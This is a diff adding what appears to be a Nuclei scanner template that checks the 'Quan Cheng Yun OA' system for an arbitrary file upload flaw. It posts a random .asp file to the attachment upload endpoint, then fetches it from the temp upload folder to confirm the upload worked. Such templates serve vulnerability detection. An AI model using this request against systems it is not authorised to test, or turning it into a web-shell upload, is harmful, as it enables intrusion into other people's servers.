@@ -1,0 +1,51 @@
+id: poc-yaml-quan-cheng-yun-uploadfile-anyfile-upload
+info:
+  name: Quan Cheng Yun OA UploadFile Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_base(8)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/OA/api/2.0/Common/AttachFile/UploadFile"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryNe8DcVuv1vEUWDaR"
+    body: |-
+      ------WebKitFormBoundaryNe8DcVuv1vEUWDaR
+      Content-Disposition: form-data; name="upload";filename="{{t1}}.asp"
+
+      {{t2}}
+      ------WebKitFormBoundaryNe8DcVuv1vEUWDaR--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"fileTargetPath\":"
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        group: 1
+        regex:
+          - "([a-z0-9-]+).asp"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/OA/upfiles/temp/{{file}}.asp"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{t2}}"
+      - type: status
+        status:
+          - 200
